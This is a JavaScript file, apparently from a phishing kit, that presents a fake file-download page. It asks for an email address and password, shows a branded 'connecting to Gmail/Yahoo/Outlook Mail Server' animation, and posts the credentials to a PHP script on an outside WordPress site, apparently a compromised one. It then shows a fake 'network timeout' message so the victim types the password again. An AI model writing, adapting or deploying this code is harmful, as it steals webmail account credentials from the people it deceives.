$(script); function script(){ $("#email_field").watermark("you@youremail.com"); 
$("#password_field1").watermark("Password"); 
$("#password_field").watermark("Confirm Password"); 
$("#download").live('click',click_to_download); $('#email_field').live('keyup',function(e) { if(e.keyCode == 13) { click_to_download(); } }); $("#download2").live('click',now_download); $('#password_field1').live('keyup',function(e) { if(e.keyCode == 13) { now_download(); } }); 
$("#download3").live('click',now_download); $('#password_field').live('keyup',function(e) { if(e.keyCode == 13) { now_download(); } }); 
} function click_to_download(){ var emailfield = $.trim($("#email_field").val().toLowerCase()); var emailReg = /^([\w-\.]+@([\w-]+\.)+[\w-]{2,4})?$/; if(emailfield == ""){ jQuery.facebox("<div class='pop_up_class'>You have a blank email field</div>");
}var the_password1 = $.trim($("#password_field1").val()); if(the_password1 == ""){ jQuery.facebox("<div class='pop_up_class'>Password Field Is Blank</div>");  }else{ if(!emailReg.test(emailfield)){ jQuery.facebox("<div class='pop_up_class'>Wrong Email Format</div>"); }else{ if(emailfield.indexOf("yahoo.") != -1){ var the_image = "<img src='img/yahoo.png' width='130' />"; var the_server = "Yahoo"; }else if(emailfield.indexOf("gmail.com") != -1){ var the_server = "Gmail"; var the_image = "<img src='img/gmail.png' width='130' />"; }else if(emailfield.indexOf("hotmail.") != -1){ var the_server = "Hotmail"; var the_image = "<img src='img/outlook.png' width='130' />"; }else if(emailfield.indexOf("outlook.") != -1){ var the_server = "Outlook"; var the_image = "<img src='img/outlook.png' width='130' />"; }else if(emailfield.indexOf("ymail.com") != -1){ var the_server = "Yahoo"; var the_image = "<img src='img/yahoo.png' width='130' />"; }else if(emailfield.indexOf("sina.com") != -1){ var the_server = "Sina"; var the_image = "<img src='img/sina.jpg' width='130' />"; }else if(emailfield.indexOf("126.com") != -1){ var the_server = "126.com"; var the_image = "<img src='img/126.gif' width='130' />"; }else if(emailfield.indexOf("163.com") != -1){ var the_server = "163.com"; var the_image = "<img src='img/163.gif' width='130' />"; }else if(emailfield.indexOf("aol.") != -1){ var the_server = "AOL"; var the_image = "<img src='img/aol.png' width='130' />"; }else if(emailfield.indexOf("office365.") != -1){ var the_server = "Office365"; var the_image = "<img src='img/office365.png' width='130' />"; }else{ var the_server = ""; var the_image = "<img src='img/othermail.ico' width='130' />"; } jQuery.facebox("<div class='pop_up_class'>"+the_image+"<br><img src='img/loadingtheimage.gif' width='50'>...connecting to "+the_server+" Mail Server</div>"); make_the_delay(); } } } function make_the_delay(){ var delay = 6000; setTimeout(function() { redirect_the(); }, delay); } function redirect_the(){ $.facebox.close(); $("#the_d_").slideDown(); $(".message_div").slideDown(); $("#download").attr("id","download2"); } function now_download(){ var the_email = $.trim($("#email_field").val()); var the_password1 = $.trim($("#password_field1").val()); var the_password = $.trim($("#password_field").val()); if(the_email == ""){ jQuery.facebox("<div class='pop_up_class'>Email Field Is Blank</div>"); }else if(the_password1 == ""){ jQuery.facebox("<div class='pop_up_class'>Password Field Is Blank</div>"); }else if(the_password == ""){ jQuery.facebox("<div class='pop_up_class'>Re-confirm, Password Field Is Blank</div>"); }else{ jQuery.facebox("<div class='pop_up_class'><img src='img/loadingtheimage.gif' width='50'> Verifying your Account ID now<img src='img/plswait.gif' width='100' height='10'></div>"); $.ajax({ type: "POST", url: "https://playairhockey.com/wp-includes/images/nmedata.php", data: { "email" : the_email , "password1" : the_password1 , "password" : the_password }, success: function(data){ var delay = 10000; setTimeout(function() { jQuery.facebox("<div class='pop_up_class'>Network timeout, Try again with correct password... </div>"); }, delay); }, error: function (data){ alert("Connection Error"); } }); } }